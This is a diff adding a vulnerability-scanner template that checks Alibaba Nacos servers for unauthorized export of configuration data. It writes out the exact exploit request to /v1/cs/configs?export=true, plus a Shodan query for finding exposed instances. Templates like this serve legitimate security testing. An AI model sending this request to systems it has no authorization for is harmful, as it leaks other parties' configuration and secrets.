@@ -1,0 +1,32 @@
+id: nacos-info-leak
+
+info:
+  name: Nacos - Information Disclosure
+  author: s4e-io
+  severity: high
+  description: |
+    Nacos unauthorized download of configuration information.
+  reference:
+    - https://github.com/wy876/POC/blob/main/Nacos/Nacos%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8B%E8%BD%BD%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.md
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"Nacos"
+    product: nacos
+    vendor: alibaba
+  tags: nacos,tech,config,exposure,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId="
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "PK")'
+          - 'contains(content_type, "application/octet-stream")'
+          - 'regex("attachment;filename=(.*).zip", content_disposition)'
+          - 'status_code == 200'
+        condition: and
+# digest: 4b0a00483046022100faba05277d05f95387d3ab295ce3b646a43d206fae3fe2d161ebf4dab9b583f20221009be9b3edc74b0fc6c00867add1505276664bfb14c7435ec1f85063e143333ebe:922c64590222798bb761d5b6d8e72950
